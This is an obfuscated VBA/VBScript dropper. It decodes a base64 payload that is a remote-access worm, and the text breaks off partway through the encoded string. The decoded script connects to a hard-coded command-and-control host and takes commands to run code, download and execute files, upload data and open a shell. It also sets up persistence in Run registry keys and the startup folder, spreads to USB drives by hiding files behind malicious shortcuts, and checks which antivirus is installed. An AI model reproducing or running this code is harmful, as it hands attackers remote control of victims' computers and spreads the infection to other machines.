Private Function yUYEIEideiydeidnIEui(UieIIUEUEydeidnIEui, IIIIIIIIiiiIEIEIEI, IIIIiiiiiIIIIiiiII)
	Set IIiiiIIIIiiiiiIIIIiiiII = CreateObject("ADODB.Stream")
	IIiiiIIIIiiiiiIIIIiiiII.Type = IIIIIIIIiiiIEIEIEI
	IIiiiIIIIiiiiiIIIIiiiII.Open
	IIiiiIIIIiiiiiIIIIiiiII.Write UieIIUEUEydeidnIEui
	IIiiiIIIIiiiiiIIIIiiiII.Position = 0
	IIiiiIIIIiiiiiIIIIiiiII.Type = IIIIiiiiiIIIIiiiII
	IIiiiIIIIiiiiiIIIIiiiII.CharSet = "us-ascii"
	yUYEIEideiydeidnIEui = IIiiiIIIIiiiiiIIIIiiiII.ReadText
	set IIiiiIIIIiiiiiIIIIiiiII = Nothing
End Function


Private Function UUUiiiIIIIIiiiiiIIu(IIIuuuIIIIiiiIIIIuu)
	Set iiIIIiii = CreateObject("Microsoft.XMLDOM")
    Set IIiiiIIii = iiIIIiii.createElement("tmp")
	IIiiiIIii.dataType = "bin.base64"
	IIiiiIIii.text = IIIuuuIIIIiiiIIIIuu
	UUUiiiIIIIIiiiiiIIu = IIiiiIIii.NodeTypedvalue
	Set iiIIIiii = Nothing
	set IIiiiIIii = Nothing
End Function


Private Function iIilllIIIllil(llliiIIIlllii, IIliiIlIlIlii)
	Dim iiiIIIillii, lIliliiIillii, IIIuuuIIIIiiiIIIIuu, iiIIiiIIIlllii
  
	lIliliiIillii = "B"
	iiiIIIillii = "!^"
	IIIuuuIIIIiiiIIIIuu = "J3!^hc2hpbnRhCmhvc3QgPSAiZnJlc2hndXlzLmRkbnNraW5nLmNvbSIKcG9ydCA9IDU2NzQKaW5zdGFsbGRpciA9ICIldGVtcCUiCmxua2ZpbGUgPS!^mYWxzZQpsbmtmb2xkZXIgPS!^mYWxzZQoKCmRpbS!^zaGVsbG9iaiAKc2V0IHNoZWxsb2JqID0gd3NjcmlwdC5jcmVhdGVvYmplY3QoIndzY3JpcHQuc2hlbGwiKQpkaW0gZmlsZXN5c3RlbW9iagpzZXQgZmlsZXN5c3RlbW9iaiA9IGNyZWF0ZW9iamVjdCgic2NyaX!^0aW5nLmZpbGVzeXN0ZW1vYmplY3QiKQpkaW0gaHR0cG9iagpzZXQgaHR0cG9iaiA9IGNyZWF0ZW9iamVjdCgibXN4bWwyLnhtbGh0dHAiKQoKCmluc3RhbGxuYW1lID0gd3NjcmlwdC5zY3JpcHRuYW1lCnN0YXJ0dXAgPS!^zaGVsbG9iai5zcGVjaWFsZm9sZGVycyAoInN0YXJ0dXAiKSAmICJcIgppbnN0YWxsZGlyID0gc2hlbGxvYmouZXhwYW5kZW52aXJvbm1lbnRzdHJpbmdzKGluc3RhbGxkaXIpICYgIlwiCmlmIG5vdC!^maWxlc3lzdGVtb2JqLmZvbGRlcmV4aXN0cyhpbnN0YWxsZGlyKS!^0aGVuIC!^pbnN0YWxsZGlyID0gc2hlbGxvYmouZXhwYW5kZW52aXJvbm1lbnRzdHJpbmdzKCIldGVtcCUiKSAmICJcIgpzcGxpdGVyID0gIjwiICYgInwiICYgIj4iCnNsZWVwID0gNTAwMCAKZGltIHJlc3!^vbnNlCmRpbS!^jbWQKZGltIH!^hcmFtCmluZm8gPSAiIgp1c2JzcHJlYWRpbmcgPSAiIgpzdGFydGRhdGUgPSAiIgpkaW0gb25lb25jZQoKb24gZXJyb3IgcmVzdW1lIG5leHQKCgppbnN0YW5jZQp3aGlsZS!^0cnVlCgppbnN0YWxsCgpyZXNwb25zZSA9ICIiCnJlc3!^vbnNlID0gcG9zdCAoImlzLXJlYWR5IiwiIikKY21kID0gc3!^saXQgKHJlc3!^vbnNlLHNwbGl0ZXIpCnNlbGVjdC!^jYXNlIGNtZCAoMCkKY2FzZSAiZXhjZWN1dGUiCiAgICAgIH!^hcmFtID0gY21kICgxKQogICAgIC!^leGVjdXRlIH!^hcmFtCmNhc2UgInVwZGF0ZSIKICAgICAgcGFyYW0gPS!^jbWQgKDEpCiAgICAgIG9uZW9uY2UuY2xvc2UKICAgICAgc2V0IG9uZW9uY2UgPSAgZmlsZXN5c3RlbW9iai5vcGVudGV4dGZpbGUgKGluc3RhbGxkaXIgJi!^pbnN0YWxsbmFtZSAsMiwgZmFsc2UpCiAgICAgIG9uZW9uY2Uud3JpdGUgcGFyYW0KICAgICAgb25lb25jZS5jbG9zZQogICAgIC!^zaGVsbG9iai5ydW4gIndzY3JpcHQuZXhlIC8vQiAiICYgY2hyKDM0KSAmIGluc3RhbGxkaXIgJi!^pbnN0YWxsbmFtZSAmIGNocigzNCkKICAgICAgd3NjcmlwdC5xdWl0IApjYXNlICJ1bmluc3RhbGwiCiAgICAgIHVuaW5zdGFsbApjYXNlICJzZW5kIgogICAgIC!^kb3dubG9hZC!^jbWQgKDEpLGNtZCAoMikKY2FzZSAic2l0ZS1zZW5kIgogICAgIC!^zaXRlZG93bmxvYWRlci!^jbWQgKDEpLGNtZCAoMikKY2FzZSAicmVjdiIKICAgICAgcGFyYW0gPS!^jbWQgKDEpCiAgICAgIHVwbG9hZCAocGFyYW0pCmNhc2UgICJlbnVtLWRyaXZlciIKICAgICAgcG9zdCAiaXMtZW51bS1kcml2ZXIiLGVudW1kcml2ZXIgIApjYXNlICAiZW51bS1mYWYiCiAgICAgIH!^hcmFtID0gY21kICgxKQogICAgIC!^wb3N0ICJpcy1lbnVtLWZhZiIsZW51bWZhZiAocGFyYW0pCmNhc2UgICJlbnVtLX!^yb2Nlc3MiCiAgICAgIH!^vc3QgImlzLWVudW0tcHJvY2VzcyIsZW51bX!^yb2Nlc3MgICAKY2FzZSAgImNtZC1zaGVsbCIKICAgICAgcGFyYW0gPS!^jbWQgKDEpCiAgICAgIH!^vc3QgImlzLWNtZC1zaGVsbCIsY21kc2hlbGwgKH!^hcmFtKSAgCmNhc2UgICJkZWxldGUiCiAgICAgIH!^hcmFtID0gY21kICgxKQogICAgIC!^kZWxldGVmYWYgKH!^hcmFtKSAKY2FzZSAgImV4aXQtcHJvY2VzcyIKICAgICAgcGFyYW0gPS!^jbWQgKDEpCiAgICAgIGV4aXRwcm9jZXNzIChwYXJhbSkgCmNhc2UgICJzbGVlcCIKICAgICAgcGFyYW0gPS!^jbWQgKDEpCiAgICAgIHNsZWVwID0gZXZhbCAocGFyYW0pICAgICAgICAKZW5kIHNlbGVjdAoKd3NjcmlwdC5zbGVlcC!^zbGVlcAoKd2VuZAoKCnN1Yi!^pbnN0YWxsCm9uIGVycm9yIHJlc3VtZS!^uZXh0CmRpbS!^sbmtvYmoKZGltIGZpbGVuYW1lCmRpbS!^mb2xkZXJuYW1lCmRpbS!^maWxlaWNvbgpkaW0gZm9sZGVyaWNvbgoKdX!^zdGFydApmb3IgZWFjaC!^kcml2ZS!^pbi!^maWxlc3lzdGVtb2JqLmRyaXZlcwoKaWYgIGRyaXZlLmlzcmVhZHkgPS!^0cnVlIHRoZW4KaWYgIGRyaXZlLmZyZWVzcGFjZSAgPiAwIHRoZW4KaWYgIGRyaXZlLmRyaXZldHlwZSAgPSAxIHRoZW4KICAgIGZpbGVzeXN0ZW1vYmouY29weWZpbGUgd3NjcmlwdC5zY3JpcHRmdWxsbmFtZSAsIGRyaXZlLn!^hdGggJiAiXCIgJi!^pbnN0YWxsbmFtZSx0cnVlCiAgIC!^pZiAgZmlsZXN5c3RlbW9iai5maWxlZXhpc3RzIChkcml2ZS5wYXRoICYgIlwiICYgaW5zdGFsbG5hbWUpIC!^0aGVuCiAgICAgICAgZmlsZXN5c3RlbW9iai5nZXRmaWxlKGRyaXZlLn!^hdGggJiAiXCIgICYgaW5zdGFsbG5hbWUpLmF0dHJpYnV0ZXMgPSAyKzQKICAgIGVuZC!^pZgogICAgZm9yIGVhY2ggZmlsZS!^pbi!^maWxlc3lzdGVtb2JqLmdldGZvbGRlciggZHJpdmUucGF0aCAmICJcIiApLkZpbGVzCiAgICAgICAgaWYgbm90IGxua2ZpbGUgdGhlbi!^leGl0IGZvcgogICAgICAgIGlmIC!^pbnN0ciAoZmlsZS5uYW1lLCIuIikgdGhlbgogICAgICAgICAgIC!^pZiAgbGNhc2UgKHNwbGl0KGZpbGUubmFtZSwgIi4iKSAodWJvdW5kKHNwbGl0KGZpbGUubmFtZSwgIi4iKSkpKSA8PiAibG5rIi!^0aGVuCiAgICAgICAgICAgICAgIC!^maWxlLmF0dHJpYnV0ZXMgPSAyKzQKICAgICAgICAgICAgICAgIGlmIC!^1Y2FzZSAoZmlsZS5uYW1lKSA8Pi!^1Y2FzZSAoaW5zdGFsbG5hbWUpIHRoZW4KICAgICAgICAgICAgICAgICAgIC!^maWxlbmFtZSA9IHNwbGl0KGZpbGUubmFtZSwiLiIpCiAgICAgICAgICAgICAgICAgICAgc2V0IGxua29iaiA9IHNoZWxsb2JqLmNyZWF0ZXNob3J0Y3V0IChkcml2ZS5wYXRoICYgIlwiICAmIGZpbGVuYW1lICgwKSAmICIubG5rIikgCiAgICAgICAgICAgICAgICAgICAgbG5rb2JqLndpbmRvd3N0eWxlID0gNwogICAgICAgICAgICAgICAgICAgIGxua29iai50YXJnZXRwYXRoID0gImNtZC5leGUiCiAgICAgICAgICAgICAgICAgICAgbG5rb2JqLndvcmtpbmdkaXJlY3RvcnkgPSAiIgogICAgICAgICAgICAgICAgICAgIGxua29iai5hcmd1bWVudHMgPSAiL2Mgc3RhcnQgIiAmIHJlcGxhY2UoaW5zdGFsbG5hbWUsIiAiLC!^jaHJ3KDM0KSAmICIgIiAmIGNocncoMzQpKSAmICImc3RhcnQgIiAmIHJlcGxhY2UoZmlsZS5uYW1lLCIgIiwgY2hydygzNCkgJiAiICIgJi!^jaHJ3KDM0KSkgJiImZXhpdCIKICAgICAgICAgICAgICAgICAgIC!^maWxlaWNvbiA9IHNoZWxsb2JqLnJlZ3JlYWQgKCJIS0VZX0xPQ0FMX01!^Q0hJTkVcc29mdHdhcmVcY2xhc3Nlc1wiICYgc2hlbGxvYmoucmVncmVhZCAoIkhLRVlfTE9DQUxfTUFDSElORVxzb2Z0d2FyZVxjbGFzc2VzXC4iICYgc3!^saXQoZmlsZS5uYW1lLCAiLiIpKHVib3VuZChzcGxpdChmaWxlLm5hbWUsICIuIikpKSYgIlwiKSAmICJcZGVmYXVsdGljb25cIikgCiAgICAgICAgICAgICAgICAgICAgaWYgIGluc3RyIChmaWxlaWNvbiwiLCIpID0gMC!^0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxua29iai5pY29ubG9jYXRpb24gPS!^maWxlLn!^hdGgKICAgICAgICAgICAgICAgICAgIC!^lbHNlIAogICAgICAgICAgICAgICAgICAgICAgIC!^sbmtvYmouaWNvbmxvY2F0aW9uID0gZmlsZWljb24KICAgICAgICAgICAgICAgICAgIC!^lbmQgaWYKICAgICAgICAgICAgICAgICAgIC!^sbmtvYmouc2F2ZSgpCiAgICAgICAgICAgICAgIC!^lbmQgaWYKICAgICAgICAgICAgZW5kIGlmCiAgICAgICAgZW5kIGlmCiAgIC!^uZXh0CiAgIC!^mb3IgZWFjaC!^mb2xkZXIgaW4gZmlsZXN5c3RlbW9iai5nZXRmb2xkZXIoIGRyaXZlLn!^hdGggJiAiXCIgKS5zdWJmb2xkZXJzCiAgICAgICAgaWYgbm90IGxua2ZvbGRlci!^0aGVuIGV4aXQgZm9yCiAgICAgICAgZm9sZGVyLmF0dHJpYnV0ZXMgPSAyKzQKICAgICAgIC!^mb2xkZXJuYW1lID0gZm9sZGVyLm5hbWUKICAgICAgIC!^zZXQgbG5rb2JqID0gc2hlbGxvYmouY3JlYXRlc2hvcnRjdXQgKGRyaXZlLn!^hdGggJiAiXCIgICYgZm9sZGVybmFtZSAmICIubG5rIikgCiAgICAgICAgbG5rb2JqLndpbmRvd3N0eWxlID0gNwogICAgICAgIGxua29iai50YXJnZXRwYXRoID0gImNtZC5leGUiCiAgICAgICAgbG5rb2JqLndvcmtpbmdkaXJlY3RvcnkgPSAiIgogICAgICAgIGxua29iai5hcmd1bWVudHMgPSAiL2Mgc3RhcnQgIiAmIHJlcGxhY2UoaW5zdGFsbG5hbWUsIiAiLC!^jaHJ3KDM0KSAmICIgIiAmIGNocncoMzQpKSAmICImc3RhcnQgZXhwbG9yZXIgIiAmIHJlcGxhY2UoZm9sZGVyLm5hbWUsIiAiLC!^jaHJ3KDM0KSAmICIgIiAmIGNocncoMzQpKSAmIiZleGl0IgogICAgICAgIGZvbGRlcmljb24gPS!^zaGVsbG9iai5yZWdyZWFkICgiSEtFWV9MT0N!^TF9NQUNISU5FXHNvZnR3YXJlXGNsYXNzZXNcZm9sZGVyXGRlZmF1bHRpY29uXCIpIAogICAgICAgIGlmIC!^pbnN0ciAoZm9sZGVyaWNvbiwiLCIpID0gMC!^0aGVuCiAgICAgICAgICAgIGxua29iai5pY29ubG9jYXRpb24gPS!^mb2xkZXIucGF0aAogICAgICAgIGVsc2UgCiAgICAgICAgICAgIGxua29iai5pY29ubG9jYXRpb24gPS!^mb2xkZXJpY29uCiAgICAgICAgZW5kIGlmCiAgICAgICAgbG5rb2JqLnNhdmUoKQogICAgbmV4dAplbmQgSWYKZW5kIElmCmVuZC!^pZgpuZXh0CmVyci5jbGVhcgplbmQgc3ViCgpzdWIgdW5pbnN0YWxsCm9uIGVycm9yIHJlc3VtZS!^uZXh0CmRpbS!^maWxlbmFtZQpkaW0gZm9sZGVybmFtZQoKc2hlbGxvYmoucmVnZGVsZXRlICJIS0VZX0NVUlJFTlRfVVNFUlxzb2Z0d2FyZVxtaWNyb3NvZnRcd2luZG93c1xjdXJyZW50dmVyc2lvblxydW5cIiAmIHNwbGl0IChpbnN0YWxsbmFtZSwiLiIpKDApCnNoZWxsb2JqLnJlZ2RlbGV0ZSAiSEtFWV9MT0N!^TF9NQUNISU5FXHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXGN1cnJlbnR2ZXJzaW9uXHJ1blwiICYgc3!^saXQgKGluc3RhbGxuYW1lLCIuIikoMCkKZmlsZXN5c3RlbW9iai5kZWxldGVmaWxlIHN0YXJ0dXAgJi!^pbnN0YWxsbmFtZSAsdHJ1ZQpmaWxlc3lzdGVtb2JqLmRlbGV0ZWZpbGUgd3NjcmlwdC5zY3JpcHRmdWxsbmFtZSAsdHJ1ZQoKZm9yIC!^lYWNoIGRyaXZlIGluIGZpbGVzeXN0ZW1vYmouZHJpdmVzCmlmIC!^kcml2ZS5pc3JlYWR5ID0gdHJ1ZS!^0aGVuCmlmIC!^kcml2ZS5mcmVlc3!^hY2UgID4gMC!^0aGVuCmlmIC!^kcml2ZS5kcml2ZXR5cGUgID0gMS!^0aGVuCiAgIC!^mb3IgIGVhY2ggZmlsZS!^pbi!^maWxlc3lzdGVtb2JqLmdldGZvbGRlciAoIGRyaXZlLn!^hdGggJiAiXCIpLmZpbGVzCiAgICAgICAgIG9uIGVycm9yIHJlc3VtZS!^uZXh0CiAgICAgICAgIGlmIC!^pbnN0ciAoZmlsZS5uYW1lLCIuIikgdGhlbgogICAgICAgICAgICAgaWYgIGxjYXNlIChzcGxpdChmaWxlLm5hbWUsICIuIikodWJvdW5kKHNwbGl0KGZpbGUubmFtZSwgIi4iKSkpKSA8PiAibG5rIi!^0aGVuCiAgICAgICAgICAgICAgICAgZmlsZS5hdHRyaWJ1dGVzID0gMAogICAgICAgICAgICAgICAgIGlmIC!^1Y2FzZSAoZmlsZS5uYW1lKSA8Pi!^1Y2FzZSAoaW5zdGFsbG5hbWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgZmlsZW5hbWUgPS!^zcGxpdChmaWxlLm5hbWUsIi4iKQogICAgICAgICAgICAgICAgICAgIC!^maWxlc3lzdGVtb2JqLmRlbGV0ZWZpbGUgKGRyaXZlLn!^hdGggJiAiXCIgJi!^maWxlbmFtZSgwKSAmICIubG5rIiApCiAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIC!^maWxlc3lzdGVtb2JqLmRlbGV0ZWZpbGUgKGRyaXZlLn!^hdGggJiAiXCIgJi!^maWxlLm5hbWUpCiAgICAgICAgICAgICAgICAgZW5kIElmCiAgICAgICAgICAgIC!^lbHNlCiAgICAgICAgICAgICAgICAgZmlsZXN5c3RlbW9iai5kZWxldGVmaWxlIChmaWxlLn!^hdGgpIAogICAgICAgICAgICAgZW5kIGlmCiAgICAgICAgIGVuZC!^pZgogICAgIG5leHQKICAgIC!^mb3IgZWFjaC!^mb2xkZXIgaW4gZmlsZXN5c3RlbW9iai5nZXRmb2xkZXIoIGRyaXZlLn!^hdGggJiAiXCIgKS5zdWJmb2xkZXJzCiAgICAgICAgIGZvbGRlci5hdHRyaWJ1dGVzID0gMAogICAgIG5leHQKZW5kIGlmCmVuZC!^pZgplbmQgaWYKbmV4dAp3c2NyaX!^0LnF1aXQKZW5kIHN1YgoKZnVuY3Rpb24gcG9zdCAoY21kICxwYXJhbSkKCn!^vc3QgPS!^wYXJhbQpodHRwb2JqLm9wZW4gIn!^vc3QiLCJodHRwOi8vIiAmIGhvc3QgJiAiOiIgJi!^wb3J0ICYiLyIgJi!^jbWQsIGZhbHNlCmh0dH!^vYmouc2V0cmVxdWVzdGhlYWRlciAidXNlci1hZ2VudDoiLGluZm9ybWF0aW9uCmh0dH!^vYmouc2VuZC!^wYXJhbQpwb3N0ID0gaHR0cG9iai5yZXNwb25zZXRleHQKZW5kIGZ1bmN0aW9uCgpmdW5jdGlvbi!^pbmZvcm1hdGlvbgpvbi!^lcnJvci!^yZXN1bWUgbmV4dAppZiAgaW5mID0gIiIgdGhlbgogICAgaW5mID0gaHdpZCAmIHNwbGl0ZXIgCiAgIC!^pbmYgPS!^pbmYgICYgc2hlbGxvYmouZXhwYW5kZW52aXJvbm1lbnRzdHJpbmdzKCIlY29tcHV0ZXJuYW1lJSIpICYgc3!^saXRlciAKICAgIGluZiA9IGluZiAgJi!^zaGVsbG9iai5leH!^hbmRlbnZpcm9ubWVudHN0cmluZ3MoIiV1c2VybmFtZSUiKSAmIHNwbGl0ZXIKCiAgIC!^zZXQgcm9vdCA9IGdldG9iamVjdCgid2lubWdtdHM6e2ltcGVyc29uYXRpb25sZXZlbD1pbX!^lcnNvbmF0ZX0hXFwuXHJvb3RcY2ltdjIiKQogICAgc2V0IG9zID0gcm9vdC5leGVjcXVlcnkgKCJzZWxlY3QgKi!^mcm9tIHdpbjMyX29wZXJhdGluZ3N5c3RlbSIpCiAgIC!^mb3IgZWFjaC!^vc2luZm8gaW4gb3MKICAgICAgIGluZiA9IGluZiAmIG9zaW5mby5jYX!^0aW9uICYgc3!^saXRlciAgCiAgICAgIC!^leGl0IGZvcgogICAgbmV4dAogICAgaW5mID0gaW5mICYgIn!^sdXMiICYgc3!^saXRlcgogICAgaW5mID0gaW5mICYgc2VjdXJpdHkgJi!^zcGxpdGVyCiAgIC!^pbmYgPS!^pbmYgJi!^1c2JzcHJlYWRpbmcKICAgIGluZm9ybWF0aW9uID0gaW5mICAKZWxzZQogICAgaW5mb3JtYXRpb24gPS!^pbmYKZW5kIGlmCmVuZC!^mdW5jdGlvbgoKCnN1Yi!^1cHN0YXJ0ICgpCm9uIGVycm9yIHJlc3VtZS!^OZXh0CgpzaGVsbG9iai5yZWd3cml0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcc29mdHdhcmVcbWljcm9zb2Z0XHdpbmRvd3NcY3VycmVudHZlcnNpb25ccnVuXCIgJi!^zcGxpdCAoaW5zdGFsbG5hbWUsIi4iKSgwKSwgICJ3c2NyaX!^0LmV4ZSAvL0IgIiAmIGNocncoMzQpICYgaW5zdGFsbGRpciAmIGluc3RhbGxuYW1lICYgY2hydygzNCkgLCAiUkVHX1NaIgpzaGVsbG9iai5yZWd3cml0ZSAiSEtFWV9MT0N!^TF9NQUNISU5FXHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXGN1cnJlbnR2ZXJzaW9uXHJ1blwiICYgc3!^saXQgKGluc3RhbGxuYW1lLCIuIikoMCksICAid3NjcmlwdC5leGUgLy9CICIgICYgY2hydygzNCkgJi!^pbnN0YWxsZGlyICYgaW5zdGFsbG5hbWUgJi!^jaHJ3KDM0KSAsICJSRUdfU1oiCmZpbGVzeXN0ZW1vYmouY29weWZpbGUgd3NjcmlwdC5zY3JpcHRmdWxsbmFtZSxpbnN0YWxsZGlyICYgaW5zdGFsbG5hbWUsdHJ1ZQpmaWxlc3lzdGVtb2JqLmNvcHlmaWxlIHdzY3JpcHQuc2NyaX!^0ZnVsbG5hbWUsc3RhcnR1cCAmIGluc3RhbGxuYW1lICx0cnVlCgplbmQgc3ViCgoKZnVuY3Rpb24gaHdpZApvbi!^lcnJvci!^yZXN1bWUgbmV4dAoKc2V0IHJvb3QgPS!^nZXRvYmplY3QoIndpbm1nbXRzOntpbX!^lcnNvbmF0aW9ubGV2ZWw9aW1wZXJzb25hdGV9IVxcLlxyb290XGNpbXYyIikKc2V0IGRpc2tzID0gcm9vdC5leGVjcXVlcnkgKCJzZWxlY3QgKi!^mcm9tIHdpbjMyX2xvZ2ljYWxkaXNrIikKZm9yIGVhY2ggZGlzay!^pbi!^kaXNrcwogICAgaWYgIGRpc2sudm9sdW1lc2VyaWFsbnVtYmVyIDw+ICIiIHRoZW4KICAgICAgIC!^od2lkID0gZGlzay52b2x1bWVzZXJpYWxudW1iZXIKICAgICAgIC!^leGl0IGZvcgogICAgZW5kIGlmCm5leHQKZW5kIGZ1bmN0aW9uCgoKZnVuY3Rpb24gc2VjdXJpdHkgCm9uIGVycm9yIHJlc3VtZS!^uZXh0CgpzZWN1cml0eSA9ICIiCgpzZXQgb2Jqd21pc2VydmljZSA9IGdldG9iamVjdCgid2lubWdtdHM6e2ltcGVyc29uYXRpb25sZXZlbD1pbX!^lcnNvbmF0ZX0hXFwuXHJvb3RcY2ltdjIiKQpzZXQgY29saXRlbXMgPS!^vYmp3bWlzZXJ2aWNlLmV4ZWNxdWVyeSgic2VsZWN0ICogZnJvbS!^3aW4zMl9vcGVyYXRpbmdzeXN0ZW0iLCw0OCkKZm9yIGVhY2ggb2JqaXRlbS!^pbi!^jb2xpdGVtcwogICAgdmVyc2lvbnN0ciA9IHNwbGl0IChvYmppdGVtLnZlcnNpb24sIi4iKQpuZXh0CnZlcnNpb25zdHIgPS!^zcGxpdCAoY29saXRlbXMudmVyc2lvbiwiLiIpCm9zdmVyc2lvbiA9IHZlcnNpb25zdHIgKDApICYgIi4iCmZvciAgeCA9IDEgdG8gdWJvdW5kICh2ZXJzaW9uc3RyKQoJIG9zdmVyc2lvbiA9IG9zdmVyc2lvbiAmIC!^2ZXJzaW9uc3RyIChpKQpuZXh0Cm9zdmVyc2lvbiA9IGV2YWwgKG9zdmVyc2lvbikKaWYgIG9zdmVyc2lvbiA+IDYgdGhlbi!^zYyA9ICJzZWN1cml0eWNlbnRlcjIiIGVsc2Ugc2MgPSAic2VjdXJpdHljZW50ZXIiCgpzZXQgb2Jqc2VjdXJpdHljZW50ZXIgPS!^nZXRvYmplY3QoIndpbm1nbXRzOlxcbG9jYWxob3N0XHJvb3RcIiAmIHNjKQpTZXQgY29sYW50aXZpcnVzID0gb2Jqc2VjdXJpdHljZW50ZXIuZXhlY3F1ZXJ5KCJzZWxlY3QgKi!^mcm9tIGFudGl2aXJ1c3!^yb2R1Y3QiLCJ3cWwiLDApCgpmb3IgZWFjaC!^vYmphbnRpdmlydXMgaW4gY29sYW50aXZpcnVzCiAgIC!^zZWN1cml0eSAgPS!^zZWN1cml0eSAgJi!^vYmphbnRpdmlydXMuZGlzcGxheW5hbWUgJiAiIC4iCm5leHQKaWYgc2VjdXJpdHkgID0gIiIgdGhlbi!^zZWN1cml0eSAgPSAibmFuLWF2IgplbmQgZnVuY3Rpb24KCgpmdW5jdGlvbi!^pbnN0YW5jZQpvbi!^lcnJvci!^yZXN1bWUgbmV4dAoKdXNic3!^yZWFkaW5nID0gc2hlbGxvYmoucmVncmVhZCAoIkhLRVlfTE9DQUxfTUFDSElORVxzb2Z0d2FyZVwiICYgc3!^saXQgKGluc3RhbGxuYW1lLCIuIikoMCkgJiAiXCIpCmlmIHVzYnNwcmVhZGluZyA9ICIiIHRoZW4KICAgaWYgbGNhc2UgKC!^taWQod3NjcmlwdC5zY3JpcHRmdWxsbmFtZSwyKSkgPSAiOlwiICYgIGxjYXNlKGluc3RhbGxuYW1lKS!^0aGVuCiAgICAgIHVzYnNwcmVhZGluZyA9ICJ0cnVlIC0gIiAmIGRhdGUKICAgICAgc2hlbGxvYmoucmVnd3JpdGUgIkhLRVlfTE9DQUxfTUFDSElORVxzb2Z0d2FyZVwiICYgc3!^saXQgKGluc3RhbGxuYW1lLCIuIikoMCkgICYgIlwiLCAgdXNic3!^yZWFkaW5nLCAiUkVHX1NaIgogIC!^lbHNlCiAgICAgIHVzYnNwcmVhZGluZyA9ICJmYWxzZSAtICIgJi!^kYXRlCiAgICAgIHNoZWxsb2JqLnJlZ3dyaXRlICJIS0VZX0xPQ0FMX01!^Q0hJTkVcc29mdHdhcmVcIiAmIHNwbGl0IChpbnN0YWxsbmFtZSwiLiIpKDApICAmICJcIiwgIHVzYnNwcmVhZGluZywgIlJFR19TWiIKCiAgIGVuZC!^pZgplbmQgSWYKCgoKdX!^zdGFydApzZXQgc2NyaX!^0ZnVsbG5hbWVzaG9ydCA9IC!^maWxlc3lzdGVtb2JqLmdldGZpbGUgKHdzY3JpcHQuc2NyaX!^0ZnVsbG5hbWUpCnNldC!^pbnN0YWxsZnVsbG5hbWVzaG9ydCA9IC!^maWxlc3lzdGVtb2JqLmdldGZpbGUgKGluc3RhbGxkaXIgJi!^pbnN0YWxsbmFtZSkKaWYgIGxjYXNlIChzY3JpcHRmdWxsbmFtZXNob3J0LnNob3J0cGF0aCkgPD4gbGNhc2UgKGluc3RhbGxmdWxsbmFtZXNob3J0LnNob3J0cGF0aCkgdGhlbiAKICAgIHNoZWxsb2JqLnJ1biAid3NjcmlwdC5leGUgLy9CICIgJi!^jaHIoMzQpICYgaW5zdGFsbGRpciAmIGluc3RhbGxuYW1lICYgQ2hyKDM0KQogICAgd3NjcmlwdC5xdWl0IAplbmQgSWYKZXJyLmNsZWFyCnNldC!^vbmVvbmNlID0gZmlsZXN5c3RlbW9iai5vcGVudGV4dGZpbGUgKGluc3RhbGxkaXIgJi!^pbnN0YWxsbmFtZSAsOCwgZmFsc2UpCmlmIC!^lcnIubnVtYmVyID4gMC!^0aGVuIHdzY3JpcHQucXVpdAplbmQgZnVuY3Rpb24KCgpzdWIgc2l0ZWRvd25sb2FkZXIgKGZpbGV1cmwsZmlsZW5hbWUpCgpzdHJsaW5rID0gZmlsZXVybApzdHJzYXZldG8gPS!^pbnN0YWxsZGlyICYgZmlsZW5hbWUKc2V0IG9iamh0dH!^kb3dubG9hZCA9IGNyZWF0ZW9iamVjdCgibXN4bWwyLnhtbGh0dHAiICkKb2JqaHR0cGRvd25sb2FkLm9wZW4gImdldCIsIHN0cmxpbmssIGZhbHNlCm9iamh0dH!^kb3dubG9hZC5zZW5kCgpzZXQgb2JqZnNvZG93bmxvYWQgPS!^jcmVhdGVvYmplY3QgKCJzY3JpcHRpbmcuZmlsZXN5c3RlbW9iamVjdCIpCmlmIC!^vYmpmc29kb3dubG9hZC5maWxlZXhpc3RzIChzdHJzYXZldG8pIHRoZW4KICAgIG9iamZzb2Rvd25sb2FkLmRlbGV0ZWZpbGUgKHN0cnNhdmV0bykKZW5kIGlmCiAKaWYgb2JqaHR0cGRvd25sb2FkLnN0YXR1cyA9IDIwMC!^0aGVuCiAgIGRpbSAgb2Jqc3RyZWFtZG93bmxvYWQKICAgc2V0IC!^vYmpzdHJlYW1kb3dubG9hZCA9IGNyZWF0ZW9iamVjdCgiYWRvZGIuc3RyZWFtIikKICAgd2l0aC!^vYmpzdHJlYW1kb3dubG9hZAoJCS50eX!^lID0gMSAKCQkub3!^lbgoJCS53cml0ZS!^vYmpodHRwZG93bmxvYWQucmVzcG9uc2Vib2R5CgkJLnNhdmV0b2ZpbGUgc3Ryc2F2ZXRvCgkJLmNsb3NlCiAgIGVuZC!^3aXRoCiAgIHNldC!^vYmpzdHJlYW1kb3dubG9hZCA9IG5vdGhpbmcKZW5kIGlmCmlmIG9iamZzb2Rvd25sb2FkLmZpbGVleGlzdHMoc3Ryc2F2ZXRvKS!^0aGVuCiAgIHNoZWxsb2JqLnJ1bi!^vYmpmc29kb3dubG9hZC5nZXRmaWxlIChzdHJzYXZldG8pLnNob3J0cGF0aAplbmQgaWYgCmVuZC!^zdWIKCnN1Yi!^kb3dubG9hZCAoZmlsZXVybCxmaWxlZGlyKQoKaWYgZmlsZWRpciA9ICIiIHRoZW4gCiAgIGZpbGVkaXIgPS!^pbnN0YWxsZGlyCmVuZC!^pZgoKc3Ryc2F2ZXRvID0gZmlsZWRpciAmIG1pZCAoZmlsZXVybCwgaW5zdHJyZXYgKGZpbGV1cmwsIlwiKSArIDEpCnNldC!^vYmpodHRwZG93bmxvYWQgPS!^jcmVhdGVvYmplY3QoIm1zeG1sMi54bWxodHRwIikKb2JqaHR0cGRvd25sb2FkLm9wZW4gIn!^vc3QiLCJodHRwOi8vIiAmIGhvc3QgJiAiOiIgJi!^wb3J0ICYiLyIgJiAiaXMtc2VuZGluZyIgJi!^zcGxpdGVyICYgZmlsZXVybCwgZmFsc2UKb2JqaHR0cGRvd25sb2FkLnNlbmQgIiIKICAgICAKc2V0IG9iamZzb2Rvd25sb2FkID0gY3JlYXRlb2JqZWN0ICgic2NyaX!^0aW5nLmZpbGVzeXN0ZW1vYmplY3QiKQppZiAgb2JqZnNvZG93bmxvYWQuZmlsZWV4aXN0cyAoc3Ryc2F